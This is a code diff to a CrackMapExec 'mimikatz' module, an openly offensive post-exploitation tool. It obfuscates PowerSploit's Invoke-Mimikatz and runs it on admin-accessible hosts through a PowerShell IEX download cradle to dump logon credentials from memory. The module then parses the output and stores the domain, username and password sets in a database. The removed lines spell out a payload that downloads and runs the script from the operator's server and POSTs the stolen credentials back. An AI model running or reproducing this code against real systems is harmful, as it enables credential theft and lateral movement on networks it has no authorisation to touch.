@@ -1,6 +1,9 @@
-from cme.helpers import create_ps_command, get_ps_script, obfs_ps_script, gen_random_string, validate_ntlm, write_log
+from cme.helpers.powershell import obfs_ps_script, gen_ps_iex_cradle
+from cme.helpers.misc import validate_ntlm
+from cme.helpers.logger import write_log, highlight
 from datetime import datetime
 import re
+
 
 class CMEModule:
     '''
@@ -9,55 +12,34 @@ class CMEModule:
     '''
 
     name = 'mimikatz'
-
-    description = "Executes PowerSploit's Invoke-Mimikatz.ps1 script"
+    description = "Dumps all logon credentials from memory"
+    supported_protocols = ['smb', 'mssql']
+    opsec_safe = True
+    multiple_hosts = True
 
     def options(self, context, module_options):
         '''
-           COMMAND Mimikatz command to execute (default: 'sekurlsa::logonpasswords')
+           COMMAND  Mimikatz command to execute (default: 'sekurlsa::logonpasswords')
         '''
-
-        self.mimikatz_command = 'privilege::debug sekurlsa::logonpasswords exit'
-
+        self.command = 'privilege::debug sekurlsa::logonpasswords exit'
         if module_options and 'COMMAND' in module_options:
-            self.mimikatz_command = module_options['COMMAND']
+            self.command = module_options['COMMAND']
 
-        #context.log.debug("Mimikatz command: '{}'".format(self.mimikatz_command))
-
-        self.obfs_name = gen_random_string()
+        self.ps_script = obfs_ps_script('powersploit/Exfiltration/Invoke-Mimikatz.ps1')
 
     def on_admin_login(self, context, connection):
+        command = "Invoke-Mimikatz -Command '{}'".format(self.command)
+        launcher = gen_ps_iex_cradle(context, 'Invoke-Mimikatz.ps1', command)
 
-        payload = '''
-        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-Mimikatz.ps1');
-        $creds = Invoke-{func_name} -Command '{command}';
-        $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
-        $request.Method = 'POST';
-        $request.ContentType = 'application/x-www-form-urlencoded';
-        $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
-        $request.ContentLength = $bytes.Length;
-        $requestStream = $request.GetRequestStream();
-        $requestStream.Write( $bytes, 0, $bytes.Length );
-        $requestStream.Close();
-        $request.GetResponse();'''.format(server=context.server, 
-                                          port=context.server_port, 
-                                          addr=context.localip,
-                                          func_name=self.obfs_name,
-                                          command=self.mimikatz_command)
-
-        context.log.debug('Payload: {}'.format(payload))
-        payload = create_ps_command(payload)
-        connection.execute(payload)
-        context.log.success('Executed payload')
+        connection.ps_execute(launcher)
+        context.log.success('Executed launcher')
 
     def on_request(self, context, request):
         if 'Invoke-Mimikatz.ps1' == request.path[1:]:
             request.send_response(200)
             request.end_headers()
 
-            with open(get_ps_script('Invoke-Mimikatz.ps1'), 'r') as ps_script:
-                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
-                request.wfile.write(ps_script)
+            request.wfile.write(self.ps_script)
 
         else:
             request.send_response(404)
@@ -67,7 +49,7 @@ class CMEModule:
         """
         uniquify mimikatz tuples based on the password
         cred format- (credType, domain, username, password, hostname, sid)
-        
+
         Stolen from the Empire project.
         """
         seen = set()
@@ -112,7 +94,7 @@ class CMEModule:
 
                 lines2 = match.split("\n")
                 username, domain, password = "", "", ""
-                
+
                 for line in lines2:
                     try:
                         if "Username" in line:
@@ -125,7 +107,7 @@ class CMEModule:
                         pass
 
                 if username != "" and password != "" and password != "(null)":
-                    
+
                     sid = ""
 
                     # substitute the FQDN in if it matches
@@ -202,22 +184,24 @@ class CMEModule:
         length = int(response.headers.getheader('content-length'))
         data = response.rfile.read(length)
 
-        #We've received the response, stop tracking this host
+        # We've received the response, stop tracking this host
         response.stop_tracking_host()
 
         if len(data):
-            creds = self.parse_mimikatz(data)
-            if len(creds):
-                context.log.success("Found credentials in Mimikatz output (domain\\username:password)")
-                for cred_set in creds:
-                    credtype, domain, username, password,_,_ = cred_set
-                    
-                    #Get the hostid from the DB
-                    hostid = context.db.get_hosts(response.client_address[0])[0][0]
+            if self.command.find('sekurlsa::logonpasswords') != -1:
+                creds = self.parse_mimikatz(data)
+                if len(creds):
+                    for cred_set in creds:
+                        credtype, domain, username, password,_,_ = cred_set
+                        # Get the hostid from the DB
+                        hostid = context.db.get_computers(response.client_address[0])[0][0]
+                        context.db.add_credential(credtype, domain, username, password, pillaged_from=hostid)
+                        context.log.highlight('{}\\{}:{}'.format(domain, username, password))
 
-                    context.db.add_credential(credtype, domain, username, password, hostid)
-                    context.log.highlight('{}\\{}:{}'.format(domain, username, password))
+                    context.log.success("Added {} credential(s) to the database".format(highlight(len(creds))))
+            else:
+                context.log.highlight(data)
 
             log_name = 'Mimikatz-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
             write_log(data, log_name)
-            context.log.info("Saved Mimikatz's output to {}".format(log_name))
+            context.log.info("Saved raw Mimikatz output to {}".format(log_name))
